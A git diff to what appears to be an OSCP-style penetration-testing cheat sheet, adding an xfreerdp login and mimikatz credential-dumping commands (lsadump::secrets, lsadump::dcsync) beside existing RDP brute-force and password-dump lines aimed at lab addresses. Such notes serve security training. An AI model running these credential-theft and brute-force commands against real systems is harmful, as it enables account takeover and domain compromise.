@@ -742,6 +742,7 @@ nmap -p 3389 --script=rdp-vuln-ms12-020.nse
 rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
 rdesktop -u guest -p guest 10.11.1.111 -g 94%
 ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
+xfreerdp /u:bill /p:Password! /v:10.11.1.111
 ```
 
 ## PostgreSQL - 5432/5433
@@ -2402,9 +2403,13 @@ https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  #Kerb
 ```
 privilege::debug  #Check Architecture for for correct mimikatz version
 
+#Password / Hash Grabbing Techniques
 sekurlsa::logonpasswords  #Dump cached passwords from logins
 
 lsadump::sam #Dumps passwords/hashes in sam file
+lsadump::secrets #Dumps passwords
+
+lsadump::dcsync /domain:corp.com /user:jeff_admin #Creates a ntlm hash from DC for lateral move
 
 ## Invoke-Mimikatz
 Invoke-Mimikatz -DumpCreds -ComputerName XOR-APP59  
